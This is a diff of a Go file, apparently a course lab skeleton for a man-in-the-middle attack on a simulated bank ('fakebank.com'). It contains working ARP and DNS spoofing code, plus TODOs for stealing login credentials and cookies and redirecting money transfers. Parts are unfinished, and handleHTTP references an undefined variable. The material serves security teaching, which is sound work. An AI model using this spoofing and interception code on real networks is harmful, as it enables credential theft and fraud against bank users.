@@ -26,21 +26,21 @@ package main
 // or the Go standard libraries. YOU MAY NOT import other third-party
 // libraries, as your code may fail to compile on the autograder.
 import (
-	// For `cs155.*` methods
-	"bytes"
-	"io"
-	"io/ioutil"
-	"log"
-	"net"
-	"net/http"
-	"os"
-	"strings"
+    // For `cs155.*` methods
+    "bytes"
+    "io"
+    "io/ioutil"
+    "log"
+    "net"
+    "net/http"
+    "os"
+    "strings"
 
-	cs155 "fakebank.com/mitm/network"
-	"github.com/google/gopacket"
-	"github.com/google/gopacket/layers"
-	"github.com/google/gopacket/pcap"
-	"golang.org/x/sys/unix"
+    cs155 "fakebank.com/mitm/network"
+    "github.com/google/gopacket"
+    "github.com/google/gopacket/layers"
+    "github.com/google/gopacket/pcap"
+    "golang.org/x/sys/unix"
 )
 
 // ==============================
@@ -48,20 +48,20 @@ import (
 // ==============================
 
 func startARPServer() {
-	// see startDNSServer() for details on these packet operations
-	handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever)
-	if err != nil {
-		log.Panic(err)
-	}
-	if err := handle.SetBPFFilter("arp and arp[6:2] = 1"); err != nil { // only grab ARP Request Frames
-		log.Panic(err)
-	} else {
-		defer handle.Close()
-		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-		for pkt := range packetSource.Packets() {
-			handleARPPacket(pkt)
-		}
-	}
+    // see startDNSServer() for details on these packet operations
+    handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever)
+    if err != nil {
+        log.Panic(err)
+    }
+    if err := handle.SetBPFFilter("arp and arp[6:2] = 1"); err != nil { // only grab ARP Request Frames
+        log.Panic(err)
+    } else {
+        defer handle.Close()
+        packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+        for pkt := range packetSource.Packets() {
+            handleARPPacket(pkt)
+        }
+    }
 }
 
 /*
@@ -70,30 +70,30 @@ func startARPServer() {
    Parameters: a packet captures on the network which may or may not be an ARP packet
 */
 func handleARPPacket(packet gopacket.Packet) {
-	arpLayer := packet.Layer(layers.LayerTypeARP)
-	if arpLayer == nil {
-		panic("unable to decode ARP packet")
-	}
+    arpLayer := packet.Layer(layers.LayerTypeARP)
+    if arpLayer == nil {
+        panic("unable to decode ARP packet")
+    }
 
-	// Manually extract the payload of the ARP layer and parse it.
-	arpPacketObj := gopacket.NewPacket(arpLayer.LayerContents(), layers.LayerTypeARP, gopacket.Default)
+    // Manually extract the payload of the ARP layer and parse it.
+    arpPacketObj := gopacket.NewPacket(arpLayer.LayerContents(), layers.LayerTypeARP, gopacket.Default)
 
-	// Check if the Ethernet frame contains a ARP request within.
-	if arpLayer := arpPacketObj.Layer(layers.LayerTypeARP); arpLayer != nil {
-		// Type-switch the layer to the correct interface in order to operate on its member variables.
-		arpData, _ := arpLayer.(*layers.ARP)
+    // Check if the Ethernet frame contains a ARP request within.
+    if arpLayer := arpPacketObj.Layer(layers.LayerTypeARP); arpLayer != nil {
+        // Type-switch the layer to the correct interface in order to operate on its member variables.
+        arpData, _ := arpLayer.(*layers.ARP)
 
-		// Only grab ARP requests that did not originate from us
-		if arpData.Operation == 1 && !bytes.Equal(arpData.SourceHwAddress, cs155.GetLocalMAC()) {
-			// TODO #1: When the client sends and ARP request, send a spoofed reply
-			//          (use ARPIntercept, SpoofARP, and SendRawEther where necessary)
-			//
-			// Hint:    Store all the data you need in the ARPIntercept struct and
-			//          pass it to spoofARP(). spoofARP() returns a slice of bytes,
-			//          which can be sent over the wire with sendRawEthernet()
+        // Only grab ARP requests that did not originate from us
+        if arpData.Operation == 1 && !bytes.Equal(arpData.SourceHwAddress, cs155.GetLocalMAC()) {
+            // TODO #1: When the client sends and ARP request, send a spoofed reply
+            //          (use ARPIntercept, SpoofARP, and SendRawEther where necessary)
+            //
+            // Hint:    Store all the data you need in the ARPIntercept struct and
+            //          pass it to spoofARP(). spoofARP() returns a slice of bytes,
+            //          which can be sent over the wire with sendRawEthernet()
 
-		}
-	}
+        }
+    }
 }
 
 /*
@@ -102,13 +102,12 @@ func handleARPPacket(packet gopacket.Packet) {
 */
 type ARPIntercept struct {
 
-	// TODO #2: Figure out what needs to be intercepted from the ARP request
-	//          for the DNS server's IP address
-	//
-	// Hint:    The types net.HardwareAddr and net.IP are the best way to represent
-	//          a hardware address and an IP address respectively.
+    // TODO #2: Figure out what needs to be intercepted from the ARP request
+    //          for the DNS server's IP address
+    //
+    // Hint:    The types net.HardwareAddr and net.IP are the best way to represent
+    //          a hardware address and an IP address respectively.
 
-	
 }
 
 /*
@@ -124,44 +123,44 @@ type ARPIntercept struct {
      Returns: the spoofed ARP reply as a slice of bytes
 */
 func spoofARP(intercept ARPIntercept) []byte {
-	// In order to make a packet with the spoofed ARP reply, we need to
-	// create a spoofed ARP reply and an Ethernet frame to send it in
-	// We will need to fill in the headers for both Ethernet and ARP
+    // In order to make a packet with the spoofed ARP reply, we need to
+    // create a spoofed ARP reply and an Ethernet frame to send it in
+    // We will need to fill in the headers for both Ethernet and ARP
 
-	// TODO #3: Fill in the missing fields below to construct your spoofed ARP response
+    // TODO #3: Fill in the missing fields below to construct your spoofed ARP response
 
-	arp := &layers.ARP{
-		AddrType:          layers.LinkTypeEthernet,
-		Protocol:          layers.EthernetTypeIPv4,
-		HwAddressSize:     6, // number of bytes in a MAC address
-		ProtAddressSize:   4, // number of bytes in an IPv4 address
-		Operation:         2, // Indicates this is an ARP reply
-		SourceHwAddress:   /* */,
-		SourceProtAddress: /* */,
-		DstHwAddress:      /* */,
-		DstProtAddress:    /* */,
-	}
-	ethernet := &layers.Ethernet{
-		EthernetType: layers.EthernetTypeARP,
-		SrcMAC:       cs155.GetLocalMAC(),
-		DstMAC:       /* */,
-	}
+    arp := &layers.ARP{
+        AddrType:          layers.LinkTypeEthernet,
+        Protocol:          layers.EthernetTypeIPv4,
+        HwAddressSize:     6, // number of bytes in a MAC address
+        ProtAddressSize:   4, // number of bytes in an IPv4 address
+        Operation:         2, // Indicates this is an ARP reply
+        SourceHwAddress:   /* */,
+        SourceProtAddress: /* */,
+        DstHwAddress:      /* */,
+        DstProtAddress:    /* */,
+    }
+    ethernet := &layers.Ethernet{
+        EthernetType: layers.EthernetTypeARP,
+        SrcMAC:       cs155.GetLocalMAC(),
+        DstMAC:       /* */,
+    }
 
-	// Now that the packet is ready to be sent, we need to "flatten" its
-	// different layers into raw bytes to send along the wire.
-	// These options will automatically calculate checksums and set them
-	// to the correct values
-	serializeOpts := gopacket.SerializeOptions{
-		FixLengths:       true,
-		ComputeChecksums: true,
-	}
+    // Now that the packet is ready to be sent, we need to "flatten" its
+    // different layers into raw bytes to send along the wire.
+    // These options will automatically calculate checksums and set them
+    // to the correct values
+    serializeOpts := gopacket.SerializeOptions{
+        FixLengths:       true,
+        ComputeChecksums: true,
+    }
 
-	buf := gopacket.NewSerializeBuffer()
+    buf := gopacket.NewSerializeBuffer()
 
-	if err := gopacket.SerializeLayers(buf, serializeOpts, ethernet, arp); err != nil {
-		log.Panic(err)
-	}
-	return buf.Bytes()
+    if err := gopacket.SerializeLayers(buf, serializeOpts, ethernet, arp); err != nil {
+        log.Panic(err)
+    }
+    return buf.Bytes()
 }
 
 /*
@@ -171,27 +170,27 @@ func spoofARP(intercept ARPIntercept) []byte {
      - toSend, the raw byte to send on the wire
 */
 func sendRawEthernet(toSend []byte) {
-	// Open aw raw Ethernet socket
-	outFD, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, unix.ETH_P_ALL)
-	if err != nil {
-		log.Panic(err)
-	}
+    // Open aw raw Ethernet socket
+    outFD, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, unix.ETH_P_ALL)
+    if err != nil {
+        log.Panic(err)
+    }
 
-	// The man page says we need Protocol, Ifindex, Halen, and Addr
-	// But it doesn't seem to be using protocol, halen, or addr
-	// Citation: man 7 packet
-	addr := unix.SockaddrLinklayer{}
-	addr.Protocol = unix.ETH_P_ARP
+    // The man page says we need Protocol, Ifindex, Halen, and Addr
+    // But it doesn't seem to be using protocol, halen, or addr
+    // Citation: man 7 packet
+    addr := unix.SockaddrLinklayer{}
+    addr.Protocol = unix.ETH_P_ARP
 
-	inter, _ := net.InterfaceByName("eth0")
-	addr.Ifindex = inter.Index
+    inter, _ := net.InterfaceByName("eth0")
+    addr.Ifindex = inter.Index
 
-	if err := unix.Sendto(outFD, toSend, 0, &addr); err != nil {
-		log.Panic("Sendto: ", err.Error())
-	}
-	if err := unix.Close(outFD); err != nil {
-		log.Panic("Close: ", err.Error())
-	}
+    if err := unix.Sendto(outFD, toSend, 0, &addr); err != nil {
+        log.Panic("Sendto: ", err.Error())
+    }
+    if err := unix.Close(outFD); err != nil {
+        log.Panic("Close: ", err.Error())
+    }
 }
 
 // ==============================
@@ -199,25 +198,25 @@ func sendRawEthernet(toSend []byte) {
 // ==============================
 
 func startDNSServer() {
-	handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever)
-	if err != nil {
-		log.Panic(err)
-	}
-	if err := handle.SetBPFFilter("udp"); err != nil { // only grab UDP packets
-		// More on BPF filtering:
-		// https://www.ibm.com/support/knowledgecenter/SS42VS_7.4.0/com.ibm.qradar.doc/c_forensics_bpf.html
-		log.Panic(err)
-	} else {
-		// close PCAP connection when program exits
-		defer handle.Close()
-		// Loop over each UDP packet received
-		// Note: This will iterate over _all_ UDP packets.
-		// Not all are guaranteed to be DNS packets.
-		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-		for pkt := range packetSource.Packets() {
-			handleUDPPacket(pkt)
-		}
-	}
+    handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever)
+    if err != nil {
+        log.Panic(err)
+    }
+    if err := handle.SetBPFFilter("udp"); err != nil { // only grab UDP packets
+        // More on BPF filtering:
+        // https://www.ibm.com/support/knowledgecenter/SS42VS_7.4.0/com.ibm.qradar.doc/c_forensics_bpf.html
+        log.Panic(err)
+    } else {
+        // close PCAP connection when program exits
+        defer handle.Close()
+        // Loop over each UDP packet received
+        // Note: This will iterate over _all_ UDP packets.
+        // Not all are guaranteed to be DNS packets.
+        packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+        for pkt := range packetSource.Packets() {
+            handleUDPPacket(pkt)
+        }
+    }
 }
 
 /*
@@ -227,54 +226,54 @@ func startDNSServer() {
 */
 func handleUDPPacket(packet gopacket.Packet) {
 
-	// Due to the BPF filter set in main(), we can assume a UDP layer is present.
-	udpLayer := packet.Layer(layers.LayerTypeUDP)
-	if udpLayer == nil {
-		panic("unable to decode UDP packet")
-	}
+    // Due to the BPF filter set in main(), we can assume a UDP layer is present.
+    udpLayer := packet.Layer(layers.LayerTypeUDP)
+    if udpLayer == nil {
+        panic("unable to decode UDP packet")
+    }
 
-	// Manually extract the payload of the UDP layer and parse it as DNS.
-	payload := udpLayer.(*layers.UDP).Payload
-	dnsPacketObj := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default)
+    // Manually extract the payload of the UDP layer and parse it as DNS.
+    payload := udpLayer.(*layers.UDP).Payload
+    dnsPacketObj := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default)
 
-	// Check if the UDP packet contains a DNS packet within. Do nothing for non-DNS UDP packets
-	if dnsLayer := dnsPacketObj.Layer(layers.LayerTypeDNS); dnsLayer != nil {
-		// Type-switch the layer to the correct interface in order to operate on its member variables.
-		dnsData, _ := dnsLayer.(*layers.DNS)
-		ipData, _ := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
-		//log.Print(udpLayer.(*layers.UDP).SrcPort)
-		//log.Print(udpLayer.(*layers.UDP).DstPort)
-		if len(dnsData.Answers) == 0 &&
-			len(dnsData.Questions) != 0 &&
-			dnsData.Questions[0].Type == layers.DNSTypeA &&
-			string(dnsData.Questions[0].Name) == "fakebank.com" {
+    // Check if the UDP packet contains a DNS packet within. Do nothing for non-DNS UDP packets
+    if dnsLayer := dnsPacketObj.Layer(layers.LayerTypeDNS); dnsLayer != nil {
+        // Type-switch the layer to the correct interface in order to operate on its member variables.
+        dnsData, _ := dnsLayer.(*layers.DNS)
+        ipData, _ := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
+        //log.Print(udpLayer.(*layers.UDP).SrcPort)
+        //log.Print(udpLayer.(*layers.UDP).DstPort)
+        if len(dnsData.Answers) == 0 &&
+            len(dnsData.Questions) != 0 &&
+            dnsData.Questions[0].Type == layers.DNSTypeA &&
+            string(dnsData.Questions[0].Name) == "fakebank.com" {
 
-			intercept := dnsIntercept{
-				reqIP: ipData.SrcIP,
-				resIP: ipData.DstIP,
-				name:  dnsData.Questions[0].Name,
-				port:  udpLayer.(*layers.UDP).SrcPort,
-			}
-			castPayload := gopacket.Payload(payload)
-			spoofedPacket := spoofDNS(intercept, castPayload)
-			sendRawUDP(53, intercept.reqIP, spoofedPacket)
-		}
+            intercept := dnsIntercept{
+                reqIP: ipData.SrcIP,
+                resIP: ipData.DstIP,
+                name:  dnsData.Questions[0].Name,
+                port:  udpLayer.(*layers.UDP).SrcPort,
+            }
+            castPayload := gopacket.Payload(payload)
+            spoofedPacket := spoofDNS(intercept, castPayload)
+            sendRawUDP(53, intercept.reqIP, spoofedPacket)
+        }
 
-		// TODO #4: When the client queries fakebank.com, send a spoofed response.
-		//          (use dnsIntercept, spoofDNS, and sendRawUDP where necessary)
-		//
-		// Hint:    Parse dnsData, then search for an exact match of "fakebank.com". To do
-		//          this, you may have to index into an array; make sure its
-		//          length is non-zero before doing so!
-		//
-		// Hint:    In addition, you don't want to respond to your spoofed
-		//          response as it travels over the network, so check that the
-		//          DNS packet has no answer (also stored in an array).
-		//
-		// Hint:    Because the payload variable above is a []byte, you may find
-		//          this line of code useful when calling spoofDNS, since it requires
-		//          a gopacket.Payload type: castPayload := gopacket.Payload(payload)
-	}
+        // TODO #4: When the client queries fakebank.com, send a spoofed response.
+        //          (use dnsIntercept, spoofDNS, and sendRawUDP where necessary)
+        //
+        // Hint:    Parse dnsData, then search for an exact match of "fakebank.com". To do
+        //          this, you may have to index into an array; make sure its
+        //          length is non-zero before doing so!
+        //
+        // Hint:    In addition, you don't want to respond to your spoofed
+        //          response as it travels over the network, so check that the
+        //          DNS packet has no answer (also stored in an array).
+        //
+        // Hint:    Because the payload variable above is a []byte, you may find
+        //          this line of code useful when calling spoofDNS, since it requires
+        //          a gopacket.Payload type: castPayload := gopacket.Payload(payload)
+    }
 }
 
 /*
@@ -283,8 +282,8 @@ func handleUDPPacket(packet gopacket.Packet) {
 */
 type dnsIntercept struct {
 
-	// TODO #5: Determine what needs to be intercepted from the DNS request
-	//          for fakebank.com in order to craft a spoofed answer.
+    // TODO #5: Determine what needs to be intercepted from the DNS request
+    //          for fakebank.com in order to craft a spoofed answer.
 
 }
 
@@ -304,66 +303,66 @@ type dnsIntercept struct {
    Returns: the spoofed DNS answer packet as a slice of bytes
 */
 func spoofDNS(intercept dnsIntercept, payload gopacket.Payload) []byte {
-	// In order to make a packet containing the spoofed DNS answer, we need
-	// to start from layer 3 of the OSI model (IP) and work upwards, filling
-	// in the headers of the IP, UDP, and finally DNS layers.
+    // In order to make a packet containing the spoofed DNS answer, we need
+    // to start from layer 3 of the OSI model (IP) and work upwards, filling
+    // in the headers of the IP, UDP, and finally DNS layers.
 
-	// TODO #6: Fill in the missing fields below to construct the base layers of
-	//          your spoofed DNS packet. If you are confused about what the Protocol
-	//          variable means, Google and IANA are your friends!
-	ip := &layers.IPv4{
-		// fakebank.com operates on IPv4 exclusively.
-		Version:  4,
-		Protocol: 17,
-		SrcIP:    /* */,
-		DstIP:    /* */,
-	}
-	udp := &layers.UDP{
-		SrcPort: layers.UDPPort(53),
-		DstPort: /* */,
-	}
+    // TODO #6: Fill in the missing fields below to construct the base layers of
+    //          your spoofed DNS packet. If you are confused about what the Protocol
+    //          variable means, Google and IANA are your friends!
+    ip := &layers.IPv4{
+        // fakebank.com operates on IPv4 exclusively.
+        Version:  4,
+        Protocol: 17,
+        SrcIP:    /* */,
+        DstIP:    /* */,
+    }
+    udp := &layers.UDP{
+        SrcPort: layers.UDPPort(53),
+        DstPort: /* */,
+    }
 
-	// The checksum for the level 4 header (which includes UDP) depends on
-	// what level 3 protocol encapsulates it; let UDP know it will be wrapped
-	// inside IPv4.
-	if err := udp.SetNetworkLayerForChecksum(ip); err != nil {
-		log.Panic(err)
-	}
-	// As long as payload contains DNS layer data, we can convert the
-	// sequence of bytes into a DNS data structure.
-	dnsPacket := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default).Layer(layers.LayerTypeDNS)
-	dns, ok := dnsPacket.(*layers.DNS)
-	if !ok {
-		log.Panic("Tried to spoof a packet that doesn't appear to have a DNS layer.")
-	}
+    // The checksum for the level 4 header (which includes UDP) depends on
+    // what level 3 protocol encapsulates it; let UDP know it will be wrapped
+    // inside IPv4.
+    if err := udp.SetNetworkLayerForChecksum(ip); err != nil {
+        log.Panic(err)
+    }
+    // As long as payload contains DNS layer data, we can convert the
+    // sequence of bytes into a DNS data structure.
+    dnsPacket := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default).Layer(layers.LayerTypeDNS)
+    dns, ok := dnsPacket.(*layers.DNS)
+    if !ok {
+        log.Panic("Tried to spoof a packet that doesn't appear to have a DNS layer.")
+    }
 
-	// TODO #7: Populate the DNS layer (dns) with your answer that points to the attack web server
-	//          Your business-minded friends may have dropped some hints elsewhere in the network!
-	resource := layers.DNSResourceRecord{
-		Name:  /* */,
-		Type:  layers.DNSType(1),
-		IP:    /* */,
-		Class: layers.DNSClass(1),
-	}
-	dns.ANCount = 1
-	dns.QR = true
-	dns.AA = true
-	dns.Answers = append(dns.Answers, resource)
-	// Now we're ready to seal off and send the packet.
-	// Serialization refers to "flattening" a packet's different layers into a
-	// raw stream of bytes to be sent over the network.
-	// Here, we want to automatically populate length and checksum fields with the correct values.
-	serializeOpts := gopacket.SerializeOptions{
-		FixLengths:       true,
-		ComputeChecksums: true,
-	}
+    // TODO #7: Populate the DNS layer (dns) with your answer that points to the attack web server
+    //          Your business-minded friends may have dropped some hints elsewhere in the network!
+    resource := layers.DNSResourceRecord{
+        Name:  /* */,
+        Type:  layers.DNSType(1),
+        IP:    /* */,
+        Class: layers.DNSClass(1),
+    }
+    dns.ANCount = 1
+    dns.QR = true
+    dns.AA = true
+    dns.Answers = append(dns.Answers, resource)
+    // Now we're ready to seal off and send the packet.
+    // Serialization refers to "flattening" a packet's different layers into a
+    // raw stream of bytes to be sent over the network.
+    // Here, we want to automatically populate length and checksum fields with the correct values.
+    serializeOpts := gopacket.SerializeOptions{
+        FixLengths:       true,
+        ComputeChecksums: true,
+    }
 
-	buf := gopacket.NewSerializeBuffer()
+    buf := gopacket.NewSerializeBuffer()
 
-	if err := gopacket.SerializeLayers(buf, serializeOpts, ip, udp, dns); err != nil {
-		log.Panic(err)
-	}
-	return buf.Bytes()
+    if err := gopacket.SerializeLayers(buf, serializeOpts, ip, udp, dns); err != nil {
+        log.Panic(err)
+    }
+    return buf.Bytes()
 }
 
 /*
@@ -379,21 +378,21 @@ func spoofDNS(intercept dnsIntercept, payload gopacket.Payload) []byte {
 
 */
 func sendRawUDP(port int, dest []byte, toSend []byte) {
-	// Opens an IPv4 socket to destination host/port.
-	outFD, _ := unix.Socket(unix.AF_INET, unix.SOCK_RAW,
-		unix.IPPROTO_RAW)
-	var destArr [4]byte
-	copy(destArr[:], dest)
-	addr := unix.SockaddrInet4{
-		Port: port,
-		Addr: destArr,
-	}
-	if err := unix.Sendto(outFD, toSend, 0, &addr); err != nil {
-		log.Panic(err)
-	}
-	if err := unix.Close(outFD); err != nil {
-		log.Panic(err)
-	}
+    // Opens an IPv4 socket to destination host/port.
+    outFD, _ := unix.Socket(unix.AF_INET, unix.SOCK_RAW,
+        unix.IPPROTO_RAW)
+    var destArr [4]byte
+    copy(destArr[:], dest)
+    addr := unix.SockaddrInet4{
+        Port: port,
+        Addr: destArr,
+    }
+    if err := unix.Sendto(outFD, toSend, 0, &addr); err != nil {
+        log.Panic(err)
+    }
+    if err := unix.Close(outFD); err != nil {
+        log.Panic(err)
+    }
 }
 
 // ==============================
@@ -404,8 +403,8 @@ func sendRawUDP(port int, dest []byte, toSend []byte) {
    startHTTPServer sets up a simple HTTP server to masquerade as fakebank.com, once DNS spoofing is successful.
 */
 func startHTTPServer() {
-	http.HandleFunc("/", handleHTTP)
-	log.Panic(http.ListenAndServe(":80", nil))
+    http.HandleFunc("/", handleHTTP)
+    log.Panic(http.ListenAndServe(":80", nil))
 }
 
 /*
@@ -418,25 +417,25 @@ func startHTTPServer() {
 */
 func handleHTTP(rw http.ResponseWriter, r *http.Request) {
 
-	if r.URL.Path == "/kill" {
-		os.Exit(1)
-	}
+    if r.URL.Path == "/kill" {
+        os.Exit(1)
+    }
 
-	// TODO #8: Handle HTTP requests. Roughly speaking, you should delegate most of the work to
-	//          SpoofBankRequest and WriteClientResponse, which handle endpoint-specific tasks,
-	//          and use this function for the more general tasks that remain, like stealing cookies
-	//          and actually communicating over the network.
-	//
-	// Hint:    You will want to create an http.Client object to deliver the spoofed
-	//          HTTP request, and to capture the real fakebank.com's response.
-	//
-	// Hint:    Make sure to check for cookies in both the request and response!
+    // TODO #8: Handle HTTP requests. Roughly speaking, you should delegate most of the work to
+    //          SpoofBankRequest and WriteClientResponse, which handle endpoint-specific tasks,
+    //          and use this function for the more general tasks that remain, like stealing cookies
+    //          and actually communicating over the network.
+    //
+    // Hint:    You will want to create an http.Client object to deliver the spoofed
+    //          HTTP request, and to capture the real fakebank.com's response.
+    //
+    // Hint:    Make sure to check for cookies in both the request and response!
 
 
-	spoofedRequest := spoofBankRequest(r)
-	
+    spoofedRequest := spoofBankRequest(r)
 
-	writeClientResponse(res, r, &rw)
+
+    writeClientResponse(res, r, &rw)
 }
 
 /*
@@ -448,49 +447,49 @@ func handleHTTP(rw http.ResponseWriter, r *http.Request) {
    Returns: The spoofed packet, ready to be sent to fakebank.com.
 */
 func spoofBankRequest(origRequest *http.Request) *http.Request {
-	var bankRequest *http.Request
-	var bankURL = "http://" + cs155.GetBankIP() + origRequest.RequestURI
+    var bankRequest *http.Request
+    var bankURL = "http://" + cs155.GetBankIP() + origRequest.RequestURI
 
-	if origRequest.URL.Path == "/login" {
+    if origRequest.URL.Path == "/login" {
 
-		// TODO #9: Since the client is logging in,
-		//          - parse the request's form data,
-		//          - steal the credentials,
-		//          - make a new request, leaving the values untouched
-		//
-		// Hint:    Once you parse the form (Google is your friend!), the form
-		//          becomes a url.Values object. As a consequence, you cannot
-		//          simply reuse origRequest, and must make a new request.
-		//          However, url.Values supports member functions Get(), Set(),
-		//          and Encode(). Encode() URL-encodes the form data into a string.
-		//
-		// Hint:    http.NewRequest()'s third parameter, body, is an io.Reader object.
-		//          You can wrap the URL-encoded form data into a Reader with the
-		//          strings.NewReader() function.
-
-
-
-	} else if origRequest.URL.Path == "/logout" {
-
-		// Since the client is just logging out, don't do anything major here
-		bankRequest, _ = http.NewRequest("POST", bankURL, nil)
-
-	} else if origRequest.URL.Path == "/transfer" {
-
-		// TODO #10: Since the client is transferring money,
-		//          - parse the request's form data
-		//          - if the form has a key named "to", modify it to "Jason"
-		//          - make a new request with the updated form values
+        // TODO #9: Since the client is logging in,
+        //          - parse the request's form data,
+        //          - steal the credentials,
+        //          - make a new request, leaving the values untouched
+        //
+        // Hint:    Once you parse the form (Google is your friend!), the form
+        //          becomes a url.Values object. As a consequence, you cannot
+        //          simply reuse origRequest, and must make a new request.
+        //          However, url.Values supports member functions Get(), Set(),
+        //          and Encode(). Encode() URL-encodes the form data into a string.
+        //
+        // Hint:    http.NewRequest()'s third parameter, body, is an io.Reader object.
+        //          You can wrap the URL-encoded form data into a Reader with the
+        //          strings.NewReader() function.
 
 
-	} else {
-		// Silently pass-through any unidentified requests
-		bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, origRequest.Body)
-	}
 
-	// Also pass-through the same headers originally provided by the client.
-	bankRequest.Header = origRequest.Header
-	return bankRequest
+    } else if origRequest.URL.Path == "/logout" {
+
+        // Since the client is just logging out, don't do anything major here
+        bankRequest, _ = http.NewRequest("POST", bankURL, nil)
+
+    } else if origRequest.URL.Path == "/transfer" {
+
+        // TODO #10: Since the client is transferring money,
+        //          - parse the request's form data
+        //          - if the form has a key named "to", modify it to "Jason"
+        //          - make a new request with the updated form values
+
+
+    } else {
+        // Silently pass-through any unidentified requests
+        bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, origRequest.Body)
+    }
+
+    // Also pass-through the same headers originally provided by the client.
+    bankRequest.Header = origRequest.Header
+    return bankRequest
 }
 
 /*
@@ -506,46 +505,46 @@ func spoofBankRequest(origRequest *http.Request) *http.Request {
 */
 func writeClientResponse(bankResponse *http.Response, origRequest *http.Request, writer *http.ResponseWriter) *http.ResponseWriter {
 
-	// Pass any cookies set by fakebank.com on to the client.
-	if len(bankResponse.Cookies()) != 0 {
-		for _, cookie := range bankResponse.Cookies() {
-			http.SetCookie(*writer, cookie)
-		}
-	}
+    // Pass any cookies set by fakebank.com on to the client.
+    if len(bankResponse.Cookies()) != 0 {
+        for _, cookie := range bankResponse.Cookies() {
+            http.SetCookie(*writer, cookie)
+        }
+    }
 
-	if origRequest.URL.Path == "/transfer" {
+    if origRequest.URL.Path == "/transfer" {
 
-		// TODO #11: Use the original request to change the recipient back to the
-		//          value expected by the client.
-		//
-		// Hint:    Unlike an http.Request object which uses an io.Reader object
-		//          as the body, the body of an http.Response object is an io.ReadCloser.
-		//          ioutil.ReadAll() takes an io.ReadCloser and outputs []byte.
-		//          ioutil.NopCloser() takes an io.Reader and outputs io.ReadCloser.
-		//      strings.ReplaceAll() replaces occurrences of substrings in string.
-		//      You can convert between []bytes and strings via string() and []byte.
-		//
-		// Hint:    bytes.NewReader() is analogous to strings.NewReader() in the
-		//          /login endpoint, where you could wrap a string in an io.Reader.
+        // TODO #11: Use the original request to change the recipient back to the
+        //          value expected by the client.
+        //
+        // Hint:    Unlike an http.Request object which uses an io.Reader object
+        //          as the body, the body of an http.Response object is an io.ReadCloser.
+        //          ioutil.ReadAll() takes an io.ReadCloser and outputs []byte.
+        //          ioutil.NopCloser() takes an io.Reader and outputs io.ReadCloser.
+        //      strings.ReplaceAll() replaces occurrences of substrings in string.
+        //      You can convert between []bytes and strings via string() and []byte.
+        //
+        // Hint:    bytes.NewReader() is analogous to strings.NewReader() in the
+        //          /login endpoint, where you could wrap a string in an io.Reader.
 
-		
-	}
 
-	// Now that all changes are complete, write the body
-	if _, err := io.Copy(*writer, bankResponse.Body); err != nil {
-		log.Fatal(err)
-	}
+    }
 
-	return writer
+    // Now that all changes are complete, write the body
+    if _, err := io.Copy(*writer, bankResponse.Body); err != nil {
+        log.Fatal(err)
+    }
+
+    return writer
 }
 
 func main() {
 
-	// The ARP server is run concurrently as a goroutine
-	go startARPServer()
+    // The ARP server is run concurrently as a goroutine
+    go startARPServer()
 
-	// The DNS server is also run concurrently as a goroutine
-	go startDNSServer()
+    // The DNS server is also run concurrently as a goroutine
+    go startDNSServer()
 
-	startHTTPServer()
+    startHTTPServer()
 }
